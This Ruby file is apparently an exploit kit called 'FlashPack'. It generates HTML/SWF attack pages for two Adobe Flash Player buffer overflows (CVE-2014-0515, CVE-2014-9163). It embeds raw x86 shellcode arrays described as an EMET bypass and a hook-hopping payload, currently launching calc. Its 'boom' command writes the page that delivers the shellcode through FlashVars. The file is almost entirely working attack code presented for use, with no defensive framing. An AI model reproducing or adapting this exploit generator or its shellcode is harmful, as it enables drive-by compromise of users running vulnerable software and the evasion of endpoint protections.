require 'highline'
require 'cli-console'
require 'fileutils'

module Flash

class Exploit

private
extend CLI::Task

public

    
@@shells={
'emet' => [0xec81e389, 0x000002cc, 0x102404c7, 0x89000100, 0x02ccb9e7, 0xc7830000, 0x04e98304, 0xaaf3c031, 0x90fe6a54,0x000000e8 ,0x428d5a00, 0x8950500f, 0x013cb8e2, 0x340f0000, 0x9090dc89,0x18a164,0xc0830000,0x81208b08,0xfff830c4,0x89e8fcff,0x60000000,0xd231e589,0x30528b64,0x8b0c528b,0x728b1452,0x4ab70f28,0x31ff3126,0x613cacc0,0x202c027c,0x10dcfc1,0x52f0e2c7,0x10528b57,0x13c428b,0x78408bd0,0x4a74c085,0x8b50d001,0x588b1848,0xe3d30120,0x348b493c,0x31d6018b,0xacc031ff,0x10dcfc1,0x75e038c7,0xf87d03f4,0x75247d3b,0x588b58e2,0x66d30124,0x8b4b0c8b,0xd3011c58,0x18b048b,0x244489d0,0x615b5b24,0xff515a59,0x5a5f58e0,0x86eb128b,0x8d016a5d,0xb985,0x31685000,0xff876f8b,0x1de0bbd5,0xa6680a2a,0xff9dbd95,0x7c063cd5,0xe0fb800a,0x47bb0575,0x6a6f7213,0xd5ff5300,0x636c6163,0x6578652e],

'hop' => [0x18a164,0xc0830000,0x81208b08,0xfff830c4,0x9de8fcff,0x60000000,0xd231e589,0x30528b64,0x8b0c528b,0x728b1452,0x4ab70f28,0x31ff3126,0x613cacc0,0x202c027c,0x10dcfc1,0x52f0e2c7,0x10528b57,0x13c428b,0x78408bd0,0x5a74c085,0x8b50d001,0x588b1848,0xe3d30120,0x348b494b,0x31d6018b,0xacc031ff,0x10dcfc1,0x75e038c7,0xf87d03f4,0x75247d3b,0x588b58e2,0x66d30124,0x8b4b0c8b,0xd3011c58,0x18b048b,0x244489d0,0x615b5b24,0x90515a59,0xff8b9090,0xec8b5590,0x05408d90,0xe0ff9090,0x5a5f5890,0xe990128b,0xffffff72,0x8d016a5d,0xcd85,0x31685000,0xff876f8b,0x909090d5,0x9090feeb,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x636c6163,0x6578652e]

}

@@exp={

'0'=> {
:CVE => 'CVE-2014-0515',
:Desc => 'Adobe FLash Player Shader Buffer Overflow',
:Usage => 'CVE_2014_0515'
},
'1'=> {
:CVE => 'CVE-2014-9163',
:Desc => 'Adobe FLash Player ParseFloat Buffer Overflow',
:Usage => 'CVE_2014_9163'
}
}

@@shellcodes ={
'0'=> {
:Desc=>	'EMET Bypass (calc for now :))',
:Usage=>'emet'
},
'1'=>{
:Desc=>'Hook Hopping (calc for now ;))',
:Usage=>'hop'
}
}

    def list_exploits(params)
        @@exp.each do |i,v|
	puts "#{i}) #{@@exp[i][:Desc]} (#{@@exp[i][:CVE]})"
	end
        
    end

    

    def load_exp(params)
	@eloaded=false;
	@@exp.each do |i,v|
      	if @@exp[i][:Usage].eql?(params[0])
	puts "[+] exploit loaded"
	@eidx=i
	@eloaded=true;
	return 
	end
	end
	puts "[-]No such exploit!"
				   
    end

    def list_shellcodes(params)
  	@@shellcodes.each do |i,v|
	puts "#{i}) Usage: #{@@shellcodes[i][:Usage]} [#{@@shellcodes[i][:Desc]}]"
	end	
    end

    def load_shellcode(params)
	@sloaded=false;
	if @eloaded
	@@shellcodes.each do |i,v|
      	if @@shellcodes[i][:Usage].eql?(params[0])
	puts "[+] shellcode loaded"
	@sidx=i
	@sloaded=true;
	return
	end
	end
	puts "[-] No such shellcode!"
	else
	puts "[-] first select the exploit"
    end
end

    def boom(params)
    if @eloaded and @sloaded
	FileUtils.mkdir_p "boom"
	FileUtils.cp "exp\\"+@@exp[@eidx][:Usage]+"\\test.swf", "boom\\"
	bytes = Array.new
	bytes=@@shells[@@shellcodes["#{@sidx}"][:Usage]]
	@payload=""
	bytes.each do |i|
	@payload+="0x#{i.to_s(16)},"
	end
	code=<<-EOS
	<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="100" height="100" />
    <param name="movie" value="test.swf" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=#{@payload}" />
    <param name="Play" value="true" />
    </object>
    </body>
    </html>
    EOS
    File.write("boom\\test.html", code)
    else
    puts "cant generate! check exploit and shellcode again." 
    end
    end
end

io = HighLine.new
exp = Flash::Exploit.new
console = CLI::Console.new(io)

console.addCommand('list_exploits',exp.method(:list_exploits), 'List Exploits')
console.addCommand('load_exp', exp.method(:load_exp), 'load <CVE>')
console.addCommand('list_shellcodes', exp.method(:list_shellcodes), 'List supported shellcodes')
console.addCommand('load_shellcode', exp.method(:load_shellcode), 'load <shellcode name>')
console.addCommand('boom', exp.method(:boom), 'Generates the exploit in current directory')
console.addHelpCommand('help', 'Help')
console.addExitCommand('exit', 'Exit from program')
console.addAlias('quit', 'exit')

console.start("FlashPack> ",[Dir.method(:pwd)])
end
